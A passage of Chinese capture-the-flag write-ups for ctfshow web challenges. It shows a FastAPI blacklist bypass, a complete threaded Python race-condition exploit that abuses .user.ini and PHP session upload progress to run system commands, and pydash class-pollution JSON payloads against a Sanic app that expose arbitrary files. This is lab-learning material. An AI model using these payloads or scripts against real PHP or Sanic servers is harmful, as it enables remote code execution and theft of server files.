+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“你好”：“fastapi2”&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fast api2</p>
+<p>首先就是了解fastapi2这个东西</p>
+<p>FastAPI 是一个现代、快速（高性能）的 Web 框架，用于构建基于 Python 的 **<a href="https://apifox.com/apiskills/understanding-apis/">API</a>**。它是一个开源项目，基于 Starlette 和 Pydantic 库构建而成，提供了强大的功能和高效的性能。</p>
+<p>在 FastAPI 中，<code>/docs</code> 路由提供了一个自动生成的交互式 API 文档界面。这是 FastAPI 的一个非常有用的特性，用于查看和测试 API 的各个端点</p>
+<p>在更具题目给的提示</p>
+<p>进入路由</p>
+<p>发现三个函数</p>
+<p>其中第二个calc</p>
+<p>根据提示给的黑名单</p>
+<p>我们展示全局变量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/3.png"></p>
+<p>发现可疑的变量youdontknow</p>
+<p>展示这个变量发现一堆过滤得到关键词</p>
+<p>我们用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">youdontknow.clear()</span><br></pre></td></tr></table></figure>
+
+<p>clear掉过滤的关键词语</p>
+<p>最后直接读flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/4.png"></p>
+<h3 id="fastapi2-for-阿狸"><a href="#fastapi2-for-阿狸" class="headerlink" title="fastapi2 for 阿狸"></a>fastapi2 for 阿狸</h3><p><strong>和5一样</strong></p>
+<p>clear掉</p>
+<p>嗨嗨</p>
+<h2 id="原谅6-web3"><a href="#原谅6-web3" class="headerlink" title="原谅6_web3"></a>原谅6_web3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line">(<span class="title function_ invoke__">waf_file</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">waf_content</span>(<span class="variable">$content</span>))?(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>)):<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是你输进去的文件不在waf的绕过里面就可以了</p>
+<p>绕过的东西很多但是没有绕过**.user.ini**</p>
+<p>.user.ini 文件是<strong>PHP 中用于配置特定目录的设置的特殊文件</strong>。 它类似于Apache 服务器中的 . htaccess 文件，但仅适用于PHP。 .user.ini 文件允许用户为特定目录定义PHP 配置指令，这些配置指令将在该目录及其所有子目录中的PHP 脚本执行时生效。</p>
+<p><code>.user.ini</code> 文件的主要目的是为了允许非管理员用户自定义某些 PHP 配置选项，而不需要访问主 <code>php.ini</code> 文件。这样，不同的应用程序或用户可以在自己的目录中设置特定的 PHP 配置，而不影响整个服务器的配置。</p>
+<p>这里的考点就是session和.user.ini的条件竞争</p>
+<p>参考文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+<p><strong>auto_prepend_file 表示在php程序加载应用程序前加载指定的php文件</strong></p>
+<p>GET：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=.user.ini</span><br></pre></td></tr></table></figure>
+
+<p>POST:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/tmp/sess_Gu0f3n</span><br></pre></td></tr></table></figure>
+
+<p>然后用下大佬的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Gu0f3n&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://c41b9ab0-e1f5-4e05-b75c-a7ea64fa3d91.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat ./flag.php&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Gu0f3n.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">&quot;waf.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 第一步上传.user.ini文件，将我们的session文件内容添加到默认头</span></span><br><span class="line">        y4tacker = &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;auto_prepend_file=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url + <span class="string">&quot;?file=.user.ini&quot;</span>, data=y4tacker)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$flag=&#x27;ctfshow&#123;d78ac2f0-9b57-4159-a162-6b944e7b495b&#125;&#x27;;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1721961458;s:14:&quot;content_length&quot;;i:51487;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:10:&quot;Gu0f3n.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1721961458;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sanic&#39;s revenge(复现)</title>
+    <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>复现这个之前先要学习下python的原型链污染（未学┭┮﹏┭┮）</p>
+<p>之前学了Nodejs原型链污染，Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
+<p>先看给的源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> pydash  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)  </span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):  </span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):  </span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]  </span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:  </span><br><span class="line">        pollute = Pollute()  </span><br><span class="line">        pydash.set_(pollute, key, value)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)  </span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span>  </span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span>  </span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span>  </span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);  </span><br><span class="line">        <span class="comment"># 生成日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="comment"># 备份日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们看到Pollute 路由这段</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这是一个处理 <code>/pollute</code> 路径的异步函数 <code>POLLUTE</code>，支持 <code>GET</code> 和 <code>POST</code> 方法。</li>
+<li>解析请求的 JSON 数据，获取 <code>key</code> 和 <code>value</code>。</li>
+<li>如果条件满足：<ul>
+<li>创建一个 <code>Pollute</code> 实例。</li>
+<li>使用 <code>pydash.set_</code> 函数 设置 <code>pollute</code> 实例的属性。</li>
+<li>返回 “success” 文本。</li>
+</ul>
+</li>
+<li>这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入&#x2F;tmp目录下的文件中</li>
+</ul>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段json代码就是将file_or_directory设置为”&#x2F;“我的基础还是很薄弱所以我们分析这个payload</p>
+<ol>
+<li><p><strong><code>__class__</code></strong>: 访问当前对象的类。</p>
+</li>
+<li><p><strong><code>__init__</code></strong>: 访问类的构造函数。</p>
+</li>
+<li><p><strong><code>__globals__</code></strong>: 访问构造函数的全局命名空间，这允许攻击者访问应用的全局变量。</p>
+</li>
+<li><p><strong><code>app.router.name_index.__mp_main__</code></strong>: 试图访问Sanic应用的路由器中的<code>name_index</code>，其中<code>__mp_main__</code>表示模块的名称。</p>
+</li>
+<li><p><strong><code>.static.handler.keywords.file_or_directory</code></strong>: 最终目标是访问并修改静态文件处理器的<code>file_or_directory</code>属性。</p>
+</li>
+<li><p><code>&quot;/&quot;</code>: 设置的值为根目录。（补充  ：</p>
+<p><code>file_or_directory</code> 这个属性的作用通常是用于指示文件处理器处理的是文件还是目录。攻击者试图通过修改 <code>file_or_directory</code> 属性，将其值设置为 <code>&quot;/&quot;</code>，可能导致服务器将根目录作为静态文件目录，从而暴露服务器上的敏感文件和目录。这种攻击利用了对关键属性缺乏适当验证和保护的漏洞。<br>）就可以实现任意文件读取</p>
+</li>
+</ol>
+<p><img src="/imgs/8.png"></p>
+<p>回显success，表面成功了</p>
+<p>接着我们访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;cmdline</p>
+<p>inux系统中的<code>/proc</code>文件系统的路径，并通过应用的静态文件服务暴露出来</p>
+<ul>
+<li>**<code>/proc/1/cmdline</code>**：这是一个文件，包含启动进程ID为1的进程时使用的命令行参数。</li>
+</ul>
+<p><img src="/imgs/9.png"></p>
+<p>显示当前的启动路径为&#x2F;bin&#x2F;bash&#x2F;start.sh</p>
+<p>我们继续打开这个路径</p>
+<p><img src="/imgs/10.png"></p>
+<p>发现运行的py脚本</p>
+<p><img src="/imgs/11.png"></p>
+<p>给了丢失的源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br></pre></td></tr></table></figure>
+
+<p>他这个给了secret的路径</p>
+<p>访问看看</p>
+<p><img src="/imgs/12.png"></p>
+<p>他说flag在app路由下，但是不知道他的名字 让我们找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure>
+
+<p>还给了&#x2F;adminLook的路由</p>
+<p><img src="/imgs/13.png"></p>
+<p>我们传入恶意的key 比如part 这一步很重要到后面来解释</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>传入后我们发现多了两个文件</p>
+<p><img src="/imgs/14.png"></p>
+<p>有点不一样是因为靶机过期了重新打开了</p>
+<p>我们先切换到&#x2F;tmp目录</p>
+<p><img src="/imgs/15.png"></p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>#对base属性进行污染</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/4KDN4B&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>#打开目录功能</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问static&#x2F;4KDN4B..&#x2F;</p>
+<p><img src="/imgs/16.png" alt="image-20240723165717529"></p>
+<p>最后得到flag的名字直接访问就好</p>
+<p>在把静态文件目录换成为根目录</p>
